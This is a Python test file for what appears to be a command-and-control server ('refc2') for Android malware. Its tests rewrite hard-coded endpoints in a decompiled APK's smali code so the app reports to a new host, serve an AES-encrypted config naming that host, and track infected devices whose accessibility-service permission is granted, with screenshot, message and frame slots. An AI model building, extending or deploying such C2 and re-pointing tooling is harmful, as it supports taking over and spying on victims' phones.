import base64
import json
import os
import tempfile
import unittest

from Crypto.Cipher import AES

from server import refc2, source_builder


class RuntimeEndpointInjectionTests(unittest.TestCase):
    def test_source_builder_rewrites_bootstrap_host_and_apk_id(self):
        with tempfile.TemporaryDirectory() as td:
            smali = os.path.join(td, 'smali', 'x')
            os.makedirs(smali)
            path = os.path.join(smali, 'Net.smali')
            with open(path, 'w', encoding='utf-8') as fh:
                fh.write('https://www.cohuducox.com/adv.php?apk=10068&device=\n'
                         'cohuducox.com\n'
                         'apkid=10068&line=\n'
                         '\",\\\"apkId\\\":10068}\"\n')
            changed = source_builder.patch_runtime_endpoints(
                td, {'serverUrl': 'wss://yk4.jk92.cc', 'apkId': '10020'})
            self.assertEqual(changed, 1)
            with open(path, encoding='utf-8') as fh:
                out = fh.read()
            self.assertNotIn('cohuducox.com', out)
            self.assertNotIn('10068', out)
            self.assertIn('https://yk4.jk92.cc/adv.php?apk=10020&device=', out)
            self.assertIn('apkid=10020&line=', out)


class AdvResponseTests(unittest.IsolatedAsyncioTestCase):
    async def test_https_proxy_returns_full_host_and_443(self):
        class Request:
            query = {'apk': '10020', 'device': 'phone'}
            headers = {'X-Forwarded-Host': 'yk4.jk92.cc', 'X-Forwarded-Proto': 'https'}
            host = '127.0.0.1:8794'
            scheme = 'http'

        response = await refc2.adv_php(Request())
        token = json.loads(response.text)['token']
        raw = AES.new(refc2.KEY, AES.MODE_ECB).decrypt(base64.b64decode(token))
        cfg = json.loads(raw[:-raw[-1]].decode())
        self.assertEqual(cfg['host'], 'yk4.jk92.cc')
        self.assertEqual(cfg['domain'], 'yk4.jk92.cc')
        self.assertEqual(cfg['port'], 443)
        self.assertEqual(cfg['apk'], '10020')

    async def test_public_host_without_forwarded_proto_defaults_to_443(self):
        class Request:
            query = {'apk': '10020', 'device': 'phone'}
            headers = {'Host': 'yk4.jk92.cc'}
            host = 'yk4.jk92.cc'
            scheme = 'http'

        response = await refc2.adv_php(Request())
        token = json.loads(response.text)['token']
        raw = AES.new(refc2.KEY, AES.MODE_ECB).decrypt(base64.b64decode(token))
        cfg = json.loads(raw[:-raw[-1]].decode())
        self.assertEqual(cfg['port'], 443)


class DeviceDiagProjectionTests(unittest.TestCase):
    def test_accessibility_diag_updates_panel_caps(self):
        rec = {'caps': {}}
        refc2._merge_diag_caps(rec, {
            'brand': 'samsung', 'model': 'SM-G981V', 'sdk': 33,
            'battery': 10, 'charging': True,
            'permissions': {'accessibility': True},
        })
        self.assertTrue(rec['caps']['device_info']['accessibility'])
        self.assertTrue(rec['caps']['device_info']['acc'])
        self.assertIn('BIND_ACCESSIBILITY_SERVICE', rec['caps']['permissions']['granted'])

    def test_nested_accessibility_diag_updates_panel_caps(self):
        rec = {'caps': {}}
        refc2._merge_diag_caps(rec, {
            'msg': json.dumps({'type': 'acc_lifecycle', 'event': 'onServiceConnected',
                               'permissions': {'accessibility': True}}),
        })
        self.assertTrue(rec['caps']['device_info']['acc'])


class DeviceLogProjectionTests(unittest.IsolatedAsyncioTestCase):
    async def test_http_lifecycle_log_updates_live_device(self):
        device_id = 'phone-diag-test'
        refc2.STATE['devices'][device_id] = {
            'ws': object(), 'apkid': '10020', 'last_seen': 1,
            'first_seen': 1, 'caps': {}, 'shots': [], 'msgs': [], 'frames': [],
        }

        class Request:
            async def json(self):
                return {'type': 'acc_lifecycle', 'event': 'onServiceConnected',
                        'permissions': {'accessibility': True}, 'deviceId': device_id}

        try:
            response = await refc2.device_log(Request())
            self.assertEqual(response.status, 200)
            self.assertTrue(refc2.STATE['devices'][device_id]['caps']['device_info']['acc'])
        finally:
            refc2.STATE['devices'].pop(device_id, None)


if __name__ == '__main__':
    unittest.main()
